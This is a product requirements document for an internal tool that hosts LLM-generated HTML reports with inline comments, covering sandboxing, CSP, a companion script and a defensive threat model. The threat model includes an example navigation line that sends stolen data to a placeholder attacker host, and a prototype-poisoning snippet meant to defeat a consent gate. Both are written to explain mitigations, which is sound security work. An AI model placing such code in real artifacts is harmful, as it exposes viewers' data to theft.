# PRD: Primer

**Author:** Taylan Pince
**Status:** Refined draft (open questions resolved; ready for sub-project specs)
**Last updated:** May 12, 2026

> *"The Primer was a book in appearance only. Its interior was a tissue of paper, but each page was a separate flat-panel display, which formed itself into pictures, words, and animations responsive to the reader."* — Neal Stephenson, *The Diamond Age*

## Summary

**Primer** is an internal Polygon tool that lets anyone with a Polygon Okta account upload self-contained HTML files (typically LLM-generated reports or visualizations), share them at stable URLs across the company, and collaborate on them via Google-Docs-style threaded inline comments. Hosted on Railway, isolated from other Polygon infrastructure. Upload-only ingestion in v1; intentionally narrow scope.

## Problem & Wedge

LLM-generated HTML artifacts — Claude artifacts, research reports, interactive dashboards, ad-hoc analyses — are increasingly common output across the company, but they're second-class deliverables today. They live in chat threads with single-user access (Claude artifact links), get screenshotted into Slack and lose interactivity, or get manually rebuilt into Notion or Confluence pages and lose both interactivity and fidelity. There is no place inside Polygon to drop a self-contained HTML report and have the rest of the team engage with it the way they would a Google Doc.

The unowned space is narrow but real: **preserve full interactivity of LLM-generated HTML while making it shareable across the company and collaboratable on inline.** Notion and Confluence don't accept arbitrary JS-bearing HTML. Slack canvases don't support custom HTML. Claude artifact links are gated by Claude account and don't have shared comment threads. Pasting raw HTML into Slack doesn't render. The practical result is that high-value artifacts die in DMs or get rebuilt at significant cost in lossy ways.

This tool fills that gap with a deliberately narrow scope: ingest self-contained HTML files, host them at stable URLs accessible to anyone with a Polygon Okta account, and overlay a threaded inline commenting system on top.

## Goals

- Authenticated Polygon employees can upload self-contained HTML files and get a stable shareable URL within seconds.
- Any authenticated viewer can select text or elements within a hosted artifact and drop a comment anchored to that selection.
- Threaded replies on every comment, with resolve / reopen state and @mentions that notify the mentioned person via Slack DM.
- The same document can have multiple versions over time; comments stay anchored to the version they were made on, and old threads remain replyable.
- Original uploader can delete their documents.

## Non-Goals (v1)

- No collaborative editing of the HTML itself. Artifacts are immutable per version.
- No real-time presence, live cursors, or WebSocket sync. Comments refresh via short-interval polling.
- No discovery beyond "my documents" and "recently viewed or commented on." No global feed, no search, no folders, no tags.
- No public access outside Polygon. No granular per-document permissions — everything is visible to every authenticated Polygon employee.
- No mobile-optimized UI. Desktop only.
- No API or programmatic ingestion. Upload via web UI only. (A Claude skill that publishes directly is a likely follow-up, but not in v1.)
- No version diffing or "what changed" view. All versions are independently browsable.
- No comment reactions, emoji, or rich text formatting beyond plain text + @mentions.

## Core User Flows

### Upload a new document

User signs in via Okta. From the home page or a dedicated "New Document" action, they drag an HTML file or pick one via file picker. The system validates the file (HTML, under size limit), prompts for a title (required) and optional description, then runs it through the upload pipeline: companion-script injection right before `</body>`, persistence to object storage, version metadata written to Postgres. The user lands on the document view with a copyable URL.

### Upload a new version of an existing document

From either the home page or an existing document's detail page, the user explicitly selects "Add version to existing document." A typeahead lets them pick from their own existing documents (only the document's original uploader can add versions). They drop the new HTML and optionally add a version note ("fixed Y-axis scale," "added Q2 numbers"). The system creates a new version under the same document container. The document's canonical URL (`/d/{docId}`) now serves the latest version; previous versions remain accessible at version-specific URLs (`/d/{docId}/v/{versionNumber}`).

No filename matching, no implicit version detection. Adding a version is always an explicit user action on a chosen document.

### View a document

Anyone with a valid Polygon Okta session can open any document URL. The page renders:

- Top bar: document title, version selector (defaults to latest), uploader name, upload date.
- Center: the HTML artifact, rendered inside a sandboxed iframe.
- Right sidebar: all threads on the currently selected version, sorted by document order, with resolved threads filtered behind a toggle.

Anchored comments are visualized in-iframe as highlights on text ranges or badges next to elements, with corresponding entries in the sidebar. Clicking either side scrolls and focuses the other.

### Drop a comment

The user selects text within the iframe using native browser selection, or clicks an element while in "element pick" mode (toggled via a sidebar button). A floating "Add comment" affordance appears near the selection. The user types a comment, optionally @mentions another Polygon employee via typeahead pulling from the Okta directory, and submits. The comment appears as a new thread anchored to that selection. Any @mention triggers a Slack DM to the mentioned user with a deep link back to the thread.

### Reply, resolve, reopen

Anyone with access can reply to any thread. Anyone can resolve a thread (it dims the anchor marker and moves under a "resolved" filter). Anyone can reopen a resolved thread. **Replying to a resolved thread auto-reopens it** — discussion resuming implies the thread isn't actually resolved. Replies in a thread you participated in trigger a Slack DM to other thread participants who are not the new commenter.

Comment edits and deletes are restricted to the comment author. Edits are unlimited (with an "edited" indicator after the fact); deletes leave a tombstone ("deleted by author") so reply context isn't broken. **Editing a comment to add a new @mention fires a Slack DM to the newly-mentioned user; removing a mention via edit does not notify the removed user. Self-mentions never notify.**

### Versions and old threads

When viewing the latest version of a document, you can drop new threads, reply, resolve, and reopen normally. When viewing an older version (any version that is not the latest), the document is in a read-mostly mode: you cannot drop new top-level threads, but you can reply to, resolve, and reopen existing threads anchored to that version. This preserves cross-version discussion continuity without confusing the surface area of "where do new conversations happen."

### Manage your documents

The user's home page shows two lists: **My documents** (everything they uploaded, sorted by most recent activity) and **Recently viewed or commented** (anything they opened or interacted with in the last 30 days, uncapped). There is no global index, no cross-Polygon document feed, no search. Documents not in either list are reachable only by direct URL.

A document can be deleted only by its original uploader. Delete is soft-delete with a 30-day reversible window; after that, all versions, threads, comments, and storage objects are hard-purged. The uploader's home page includes a collapsed **Recently deleted** section listing their soft-deleted documents within the window, with a "Restore" action.

### Edit document and version metadata

The original uploader can edit the document's title and description at any time, and can edit any version's note. No edit history is retained and no notifications fire — these are owner-only metadata corrections, not collaborative content.

## Data Model (sketch)

```
User
  id              -- Okta sub
  email
  display_name
  slack_user_id   -- resolved on first sign-in, used for notifications
  created_at

Document
  id
  title
  description
  uploader_id     -> User.id
  created_at
  deleted_at      -- soft delete; purged 30d later

Version
  id
  document_id     -> Document.id
  version_number  -- monotonic per document, starts at 1
  storage_key     -- object storage path to the HTML file
  size_bytes
  version_note
  created_at

Thread
  id
  version_id      -> Version.id   -- a thread belongs to exactly one version
  anchor          -- JSON, see below
  resolved_at
  resolved_by     -> User.id
  created_at

Comment
  id
  thread_id       -> Thread.id
  author_id       -> User.id
  body            -- plain text with inline @mention tokens
  mentions        -- array of User.id
  created_at
  updated_at      -- non-null if edited
  deleted_at      -- soft delete; comment renders as tombstone

Anchor (embedded JSON in Thread.anchor)
  type            -- "text-range" | "element-path"

  -- text-range fields:
    selector_text   -- the selected text itself
    prefix          -- ~32 chars of text immediately before
    suffix          -- ~32 chars of text immediately after
    container_path  -- DOM path to the nearest stable parent (disambiguation)

  -- element-path fields:
    path            -- e.g. ["body", "div:nth-child(2)", "svg", "g:nth-child(3)", "rect:nth-child(1)"]
    inner_hash      -- hash of innerText or outerHTML, for drift detection
```

## Architecture

### Components

- **Web app** (Next.js or equivalent) deployed on Railway. Handles Okta OIDC, the home page (my documents + recently viewed), the document detail view with iframe and comment sidebar, and the upload UI.
- **API layer** in the same process or separate service. REST endpoints for documents, versions, threads, and comments. All endpoints behind a signed session cookie.
- **Postgres on Railway.** Stores all metadata, comment bodies, and anchor JSON.
- **Object storage** (Railway volume or S3 bucket). Stores raw HTML files keyed by version ID. Served via the app with auth enforcement rather than direct public URLs.
- **Slack notifier worker.** Listens to a queue (Postgres LISTEN/NOTIFY or a simple jobs table). Sends Slack DMs via the Slack Web API on @mention or thread reply.

### Iframe sandboxing

Even though Railway isolation removes the cross-contamination risk with other Polygon infrastructure, uploaded HTML is rendered inside a sandboxed iframe to prevent LLM-generated JS from faking the app's chrome (e.g., a fake "session expired, log in again" overlay). The iframe sandbox attributes:

```
sandbox="allow-scripts allow-forms allow-modals allow-downloads"
```

Notably *not* `allow-same-origin` (prevents iframe access to parent cookies, localStorage, or DOM) and notably *not* `allow-popups` or `allow-popups-to-escape-sandbox` (prevents the in-iframe fake-SSO-popup phishing vector). External links from artifacts are handled instead by the companion script forwarding `<a target="_blank">` clicks and `window.open()` calls to the parent via postMessage, which validates and opens the new tab from the trusted parent context.

`allow-modals` is included because LLM-generated artifacts commonly expose a "Print / Save as PDF" button that calls `window.print()`; sandboxed iframes block all modal-dialog APIs (`alert`/`confirm`/`prompt`/`print`/`beforeunload`) without this token. The dialogs are scoped to the iframe's opaque origin — they cannot read or write parent cookies, storage, or DOM, so the worst case is a nuisance dialog inside the artifact's own viewport. `allow-downloads` is included because the same class of artifacts often build a file in memory (XLSX, CSV, PDF) and trigger `<a download>.click()` on a blob URL; without this token, those clicks are a silent no-op. The artifact already executes arbitrary JS in the sandbox and can construct any in-memory blob; `allow-downloads` only governs whether the user can persist a user-initiated build to disk, and browser-level download safety (file-type warnings, Safe Browsing) still applies.

### Iframe CSP

Set on the iframe document response:

| Directive | Value | Purpose |
|---|---|---|
| `script-src` | `'unsafe-inline' <CDN allowlist>` | Permits inline `<script>` blocks (the LLM-artifact norm) and scripts from the allowlist. |
| `style-src` | `'unsafe-inline' <CDN allowlist>` | Permits inline styles and stylesheets from the allowlist. |
| `connect-src` | `'none'` | Blocks `fetch`/XHR/WebSocket. LLM artifacts almost always embed data inline; revisit if real cases emerge. |
| `img-src` | `data: blob: 'self' https:` | Covers base64-embedded images (common), Primer-hosted assets, and external images (graceful for the few artifacts that link out). |
| `font-src` | `'self' fonts.gstatic.com` | Web fonts via the allowlist. |
| `form-action` | `'none'` | Native HTML form submission is dead, fully neutering in-iframe phishing forms. JS-driven forms (`preventDefault()` + custom handler) still work, which is how most artifact forms operate anyway. |
| `frame-src` | `'none'` | No nested iframes (also stripped at upload — see Upload sanitization). |

**CDN allowlist (script-src / style-src):** `cdn.tailwindcss.com`, `cdnjs.cloudflare.com`, `unpkg.com`, `cdn.jsdelivr.net`, `fonts.googleapis.com`, `fonts.gstatic.com`, `esm.sh`, `cdn.skypack.dev`. The last two cover the modern ESM-module pattern that Claude artifacts default to. Tightened or expanded as we see real usage.

### Upload sanitization

Sanitization is deliberately minimal — the iframe sandbox + CSP are the primary defense. At upload time the pipeline strips exactly two element types: nested `<iframe>` and `<meta http-equiv="refresh">`. Both have no legitimate use in a Primer artifact (nested embeds, auto-redirect respectively) and both expand the attack surface inside the sandbox. Everything else, including `<form>`, `<script>`, and inline event handlers, is preserved.

### Companion script

A single signed script served from the app's domain at `/companion/v1.js` is injected by the upload pipeline immediately before the closing `</body>` tag of every uploaded HTML file (alongside the `<iframe>` / `<meta refresh>` strip — the only two mutations the system makes to uploaded content). Its responsibilities:

1. Capture text selections (`selectionchange` event) and report them to the parent via `postMessage` with normalized anchor data (selected text + prefix + suffix + container path).
2. When the parent enters element-pick mode, capture the next clicked element and report its element path and inner-content hash.
3. Render in-iframe comment markers (highlights on text ranges, badges next to elements) based on anchor data the parent sends down via postMessage.
4. Resolve anchors on initial load: given anchors from the parent, find their current positions in the live DOM and report pixel coordinates back, used by the parent to align sidebar entries with their in-iframe positions.
5. Forward external navigation to the parent: intercept clicks on `<a target="_blank">` and calls to `window.open()`; postMessage the URL to the parent, which validates (`https:` only) and opens a new tab from the trusted parent context. Required because the sandbox drops `allow-popups`.

The companion script makes no network requests, accesses no parent state, and stores nothing. It is pure DOM + postMessage. Every byte added to it is attack surface inside the iframe, so we resist scope creep aggressively.

### postMessage protocol

**Parent → Iframe:**
- `init(anchors[])` — render existing anchors
- `enter_pick_mode()` / `exit_pick_mode()`
- `highlight_anchor(anchorId)` — scroll into view and visually emphasize
- `request_anchor_positions()` — return current pixel coords for all anchors

**Iframe → Parent:**
- `selection_captured(anchorData)` — user selected text
- `element_picked(anchorData)` — user clicked an element in pick mode
- `anchor_positions(positions[])` — response to position request
- `resize(height)` — iframe content height changed, parent adjusts container
- `open_external(url)` — user clicked `<a target="_blank">` or artifact called `window.open()`; parent validates `https:` and opens a new tab
- `submit_events(events[])` — consent-gated batch of structured document events the artifact handed back (see "Document events" below); parent POSTs it and answers with `submit_result`

**Parent → Iframe (document events):**
- `events(rows[])` — `artifact`-audience event rows relayed verbatim, in coalesced batches; re-dispatched to artifact JS as `CustomEvent('primer:events')`
- `submit_result({ ok, rows?, error? })` — write acknowledgment; re-dispatched as `CustomEvent('primer:submit-result')`

All messages include a shared token established at iframe initialization to reject cross-document interference.

### Document events: the artifact→backend write path (threat model)

Structured document events (issue #78) add the one sanctioned path by which
data originating INSIDE the sandboxed artifact reaches Primer's backend —
and, via the `artifact` audience tier, the one path by which stored rows are
injected back INTO sandboxed artifact code. Both directions are additions to
the threat model:

- **Write path (artifact → backend).** The sandbox and `connect-src 'none'`
  still block every direct network path; nothing here loosens them. The
  artifact can only dispatch `CustomEvent('primer:submit-events')`; the
  companion forwards it over the MessagePort only when BOTH hold: the
  dispatch happens **while the trusted gesture event's dispatch is still in
  progress** (detected via the stored event's UA-managed `eventPhase`, with
  an `isTrusted` re-check that defeats replaying a captured trusted event
  through `dispatchEvent()` — NOT via a timer- or microtask-retired flag,
  which real UA dispatch kills at the per-listener microtask checkpoint
  before the artifact's handler runs; this class of behavior is provable
  only under real input, hence the real-browser consent test tier,
  `pnpm --filter @primer/api test:browser`),
  AND the current **physical activation cluster** is unconsumed (detailed
  below).
  <br>**Prototype-poisoning of the `eventPhase` getter — closed by a freeze
  shim.** `Event.prototype.eventPhase` is a *configurable* prototype getter
  in Chrome, and artifact scripts run before the deferred companion, so a
  hostile artifact could `Object.defineProperty(Event.prototype,
  'eventPhase', { get: () => 2 })` to make the getter always report
  "in dispatch" — collapsing the in-dispatch check to "was there ever a
  genuine gesture" and letting a `setTimeout`-deferred submit ride a real
  click (the exact laundering window). Mitigation: the upload pipeline
  injects an inline shim as the **first child of `<head>`** (before any
  artifact script) that captures the native getter and re-defines
  `eventPhase` **non-configurable** (native getter intact), so the
  artifact's later redefine throws and `delete` no-ops; the gate reads the
  true, live phase. Audit of the whole class the gate + activation-cluster
  logic touch: `isTrusted` is per-instance `[LegacyUnforgeable]`
  (non-configurable, and a prototype poison is shadowed by the instance own
  property — verified, no fix needed); the cluster keys on the **registered
  event-type string** (a listener loop variable), never `e.type` off the
  instance; `MessageEvent`'s `source`/`ports`/`data` getters (init-handshake
  path only, misuse is self-harm to the artifact's own realm) are frozen by
  the same shim as behavior-preserving defense-in-depth. The stored trusted
  event instance never escapes the companion's closure, so the artifact
  cannot shadow `eventPhase` per-instance on it either. See
  `apps/api/src/upload/eventGuardShim.ts` and the poison/control tests in
  `consent.browser.test.ts`.<br>The remaining bound if a browser ever
  refused the freeze: the `isTrusted` re-check (unforgeable) still holds, so
  the worst case degrades to timing/deferral decoupling of an
  already-bounded submission — ≤1 per genuine gesture, grant-gated,
  in-audience, server-attributed — never a no-gesture auto-fire and never a
  grant bypass.
  <br>**The activation cluster** (the second necessary condition above): one
  cluster spans the whole trusted-event burst of one physical interaction
  (pointer + mouse + touch + compatibility-mouse events of one tap; a
  keydown-through-keyup keystroke, auto-repeat included). A successful
  forward consumes the cluster, so **one physical activation authorizes at
  most one submission** — an artifact with handlers on every gesture event
  type still cannot turn one incidental tap into several attributed
  submissions. Checking `navigator.userActivation.isActive` alone is
  explicitly NOT sufficient — a malicious artifact could defer its dispatch
  into the activation window of an unrelated click (activation laundering);
  the in-dispatch condition closes that. An artifact is untrusted code
  running in every viewer's browser, regardless of what produced it. The
  parent page remains the sole authed principal: it re-validates the batch
  and POSTs it; the server validates again and stamps the authenticated user
  as the row author — attribution can never be asserted from inside the
  iframe. Writes require the caller to be a document collaborator (owner
  included); external-share and public viewers cannot authenticate to these
  routes at all.

- **Element-level intent — RESOLVED by the first-submission grant (issue
  #78 security requirement 6).** The consent gate's guarantee is per
  physical activation, not per "Send button": the submit affordance lives
  INSIDE the untrusted artifact, so the companion cannot distinguish "the
  reviewer tapped Send" from "the reviewer tapped anything". The mitigation
  is a **parent-owned first-submission grant**: the first time a given
  artifact content version attempts an artifact-originated submission on a
  document, Primer-owned chrome — rendered in the parent page's DOM, which
  the artifact cannot draw over, dispatch events into, or synthesize
  acceptance of (the iframe's opaque origin reaches the parent only via the
  companion MessagePort, which carries data, never UI events) — discloses
  the envelope (event count, namespaces, and each event's `audience` with
  its plain-language meaning: who will see the data) and asks the viewer to
  allow it. Never the payload bytes. The grant persists per (viewer,
  document, artifact content version): a republished artifact is a new
  version and re-prompts; a submission carrying a broader audience tier
  than was granted (author < collaborators < artifact) re-prompts, and
  batch-splitting cannot bypass that because every submission's required
  tier is checked independently. While a prompt is open exactly ONE
  submission is held — the one whose envelope is being disclosed; anything
  else arriving is refused, so nothing queue-jumps or piggybacks on the
  grant click. Deny answers the artifact with an error
  `primer:submit-result`. **Remaining residual:** within an existing grant
  and within the granted audience tier, a hostile artifact can still ride a
  genuine physical interaction to submit content the viewer didn't
  deliberately author — capped at one submission per physical interaction
  by the activation-cluster gate, always inside the disclosed audience
  scope, always server-attributed and auditable, and bounded by the
  batch/payload caps and server-side validation.

- **`artifact` audience tier (backend → artifact).** Every event row carries
  a required `audience` (`author` | `collaborators` | `artifact`); the
  server returns to each caller exactly the rows their identity may read.
  `artifact` is the **injection boundary**: only rows that explicitly
  declared it are relayed by the parent into the sandboxed iframe, where
  they become input to untrusted artifact code in every viewer's browser.
  It must never be collapsed into `collaborators` as a simplification, and
  no audience is ever inferred from a namespace or payload. Rows are relayed
  verbatim; Primer never interprets payloads.

- **Payloads are always untrusted.** Event payloads are opaque data. Code
  consuming them (artifacts, CLIs, services) must parse and validate them,
  never execute them as instructions; agents consuming them must treat them
  as feedback to reason about, never commands. This is what keeps a
  compromised artifact — or a hostile collaborator's writes — from becoming
  a command channel into consumers.

- **Init handshake is parent-verified.** The companion's init is
  first-init-wins, so it accepts the handshake message only from the
  embedding parent frame (`event.source === window.parent` when actually
  embedded). Without that check the artifact's own JS could post a fake
  init to its own window and hijack the companion port before the real
  parent's arrives — a self-DoS plus a fake "parent" feeding the artifact
  fabricated event rows.

- **Email enumeration on user lookup.** `GET /api/users/lookup?email=`
  answers 200/404 by whether an org account exists — an authenticated
  caller can probe addresses. Accepted: the surface is org-authenticated
  only (same posture as `/api/users` typeahead, which already returns
  names and emails to any org member), and the id space it reveals is what
  event attribution requires.

- **Per-connection / per-page memory grows with the stream.** The SSE
  handler's sent-ids set and the parent page's relayed-rows buffer grow with
  the document's event count (retention is forever). Accepted for v1: both
  are bounded by a single document's stream length and by the connection /
  page lifetime; revisit if any document's stream reaches a size where this
  matters.

- **The Clipboard API does not work inside the artifact iframe
  (pre-existing; informational for artifact authors).** The sandboxed,
  opaque-origin iframe is denied `clipboard-write` by permissions policy,
  so `navigator.clipboard.writeText(...)` from artifact JS rejects with a
  policy violation (observed live, 2026-08-26). Artifacts must not build
  fallback UX on in-iframe clipboard writes (e.g. "couldn't send — copied
  to clipboard instead" silently does neither); surface data visibly (a
  selectable text block) or hand it out through the sanctioned channels
  instead. Not a security gap — one less way for artifact code to touch
  the viewer's environment — but a known consumer-facing limitation.

- **Navigation is an exfil channel the CSP does not close (pre-existing).**
  `connect-src 'none'` blocks fetch/XHR/WebSocket and `form-action 'none'`
  kills native form submission, but nothing blocks the artifact from
  navigating ITSELF (`location.href = 'https://attacker/?stolen=…'`) —
  sandboxed iframes may self-navigate without any sandbox token, and the
  upload pipeline only strips `<meta refresh>`, not scripted navigation.
  Any data present inside the iframe — the artifact's own content, and now
  `artifact`-audience event rows relayed in — is therefore exfiltratable by
  a hostile artifact to a URL of its choosing. Not widened by the events
  feature in kind (comment anchors and document content were already
  inside), but widened in value: authors choose `audience: 'artifact'`
  knowing those rows enter this trust domain. Mitigation options if ever
  needed: a `navigate-to`-style policy is not implementable today; an
  interstitial via sandbox navigation restrictions would break legitimate
  in-artifact links, so this stands as an accepted, documented risk.

### Anchor resolution & drift handling

When a user makes a selection, the companion script generates an anchor with both text-range data (primary) and element-path data (for the containing element). On render, the script attempts text-range resolution first: find the unique occurrence of `prefix + selectorText + suffix` within the document. If that fails (text changed or duplicated), it falls back to element-path: locate the element by selector path and verify the inner-content hash. If that also fails, the anchor is marked "drifted" — the comment still appears in the sidebar with a small "this comment's location could not be determined" indicator, but no in-iframe marker.

Because anchors are bound to specific immutable versions, drift should be rare in practice. The fallback exists as a safety net for content that legitimately moves at render time (e.g., charts that animate into place).

### Known anchoring limitations

- **`<canvas>` content.** A canvas has no DOM children and no selectable text, only rendered pixels. Users can anchor a comment to a `<canvas>` element as a whole (via element-path), but cannot mark regions inside it. This is surfaced in product copy where canvas content is detected (or noted in general help) so users aren't surprised.
- **SVG content.** SVG works with the element-path anchor because each shape is a real DOM node — `["body", "div:nth-child(2)", "svg", "g:nth-child(3)", "rect:nth-child(1)"]` resolves the same as any other element. No special handling.

### Notifications

When a comment is created or edited, the API:

1. Parses @mentions from the body. For each *newly* mentioned user (present in the current body, absent from the previous body in the edit case), enqueues a Slack DM job. Self-mentions are skipped. Removing a mention via edit does not notify the removed user.
2. On comment creation (not edits), looks up the parent thread. For each unique prior participant who is not the new commenter, enqueues a Slack DM job ("X replied to your thread on [document title]").
3. Each Slack message includes a deep link back to the document at the right version and thread.

No rate limiting or batching in v1 — every qualifying event fires a DM. Revisit reactively if a chatty thread produces real complaints.

**Polling cadence for new comments and replies:** 10s interval on the active document view, foreground-only (pause when the tab is blurred, resume on focus). Polls use conditional requests (`If-None-Match` / `304`) so steady-state checks are cheap on the server.

Slack `user_id` lookup happens lazily on first sign-in by matching email against the Slack Web API.

## Authentication & Access

- Okta OIDC, restricted to the Polygon Okta org. Any signed-in user has read and comment access to every document.
- Sessions via signed cookies. CSRF protection on mutating endpoints.
- **Document ownership is uploader-only** for the mutating actions on the document container itself: only the original uploader can add new versions, delete the document, edit the title or description, or edit a version note. The stranded-doc edge case (uploader leaves Polygon or hands a project off) is handled out-of-band by a manual DB poke if it actually arises; a co-owner or admin model is a deliberate v2 escape hatch.
- Comment edit and delete: only by the comment author. Thread resolve, reopen, and reply: anyone with access.

## Storage & Limits

- HTML file size: 10 MB hard limit per upload. Covers nearly all LLM artifacts including those with embedded base64 images.
- File type: a single `.html` file. No zip uploads, no folder uploads.
- Per-document version count: no enforced limit at launch; monitor and revisit.

### Upload-time validation

Each upload must pass before persistence:
1. Single file with `.html` extension and `text/html` content type.
2. Under the 10 MB cap.
3. Parses as HTML via a tolerant parser (`parse5` or equivalent). If the parse produces a usable document tree, it ships; minor brokenness is tolerated since browsers are forgiving renderers, but a file that fails to parse at all is rejected at upload with an actionable error message.

At render time, no further validation — we trust the browser to handle partial brokenness gracefully.

### Viewer layout

Desktop-only (per non-goals). Document view places the iframe on the left at remaining width and a fixed **360px** comment sidebar on the right, collapsible to a thin rail when the user wants more horizontal space for the artifact. The iframe expands vertically based on `resize(height)` postMessage from the companion script.

## Resolved Decisions

The six open questions originally listed here were resolved in the refinement pass on 2026-05-12. All decisions are now incorporated into the body of this PRD. For traceability:

| # | Topic | Decision | Where it lives in this doc |
|---|---|---|---|
| 1 | HTML sanitization scope | Strip nested `<iframe>` and `<meta http-equiv="refresh">` only. | Upload sanitization |
| 2 | External resource allowlist | PRD list + `esm.sh` + `cdn.skypack.dev`. | Iframe CSP |
| 3 | Comment edit window | Unlimited with "edited" indicator. | Reply, resolve, reopen |
| 4 | Canvas elements | Comment on the canvas as a whole; no in-canvas regions. | Known anchoring limitations |
| 5 | Comment sync model | 10s polling, foreground-only, conditional requests. | Notifications |
| 6 | Version permissions | Uploader-only for add-version, delete, and metadata edits. | Authentication & Access |

Additional gaps surfaced during refinement and resolved inline:

- Iframe popups dropped from sandbox; external navigation forwarded to the parent via the companion script.
- Replying to a resolved thread auto-reopens it.
- @mention-on-edit fires a DM for newly-added mentions; removed mentions and self-mentions do not notify.
- No rate limiting on notifications in v1.
- Uploader can edit document title, description, and version notes at any time; no edit history.
- Recently-viewed window is the last 30 days, uncapped.
- A collapsed "Recently deleted" section on the uploader's home page exposes the 30-day restore window.
- Viewer layout: 360px right sidebar, collapsible; iframe takes remaining width.
- Upload validation: single `.html` file ≤10 MB that parses with a tolerant HTML parser.

## Build Phases

The build is split into two phases. Phase 1 produces a fully working **local** application with no real auth and no Slack notifications, exercised against a single mock user identity. Phase 2 wires in the real-world integrations (existing Polygon Okta work, Slack DM notifier) and ships internally.

This local-first split exists because there is already Polygon work for Okta auth that will be plugged in once the local app is solid; trying to wire Okta during early development would consume time without changing the feature set being designed and tested.

**Phase 1 — Local app:**
1. **Local foundation.** Repo scaffold, local dev server, Postgres + local object storage, upload pipeline (validation + companion-script injection + storage write), iframe sandbox + CSP, viewer shell, empty home page, single mock user.
2. **Anchoring + companion script.** Companion script, postMessage protocol, text-range anchor capture and rendering, anchor positioning, external-nav forwarding. No comment storage yet — substrate only.
3. **Comments + threading + dashboard.** Thread + Comment data model, comment creation, sidebar, replies, resolve/reopen (auto-reopen-on-reply), 10s polling, edit/delete by author, dashboard ("my docs" + "recently viewed").
4. **Versioning + soft-delete.** Add-new-version, version selector, per-version threads, cross-version continuity, version notes, metadata editing, recently-deleted section + 30-day restore.

**Phase 2 — Connect to the real world:**
5. **Auth + ownership.** Replace mock user with existing Polygon Okta integration; enforce uploader-only rules; session cookies; CSRF.
6. **Slack notifications.** Slack notifier worker, @mention typeahead, mention parsing (initial + edit-add), Okta→Slack ID resolution, deep links.
7. **Element-path fallback + polish.** Element-path anchor as resolution fallback, drift indicator, real-usage CSP/sandbox refinement, internal alpha launch.

Each sub-project will be designed and planned independently. See `docs/superpowers/specs/2026-05-12-primer-decomposition-design.md` for the full decomposition.
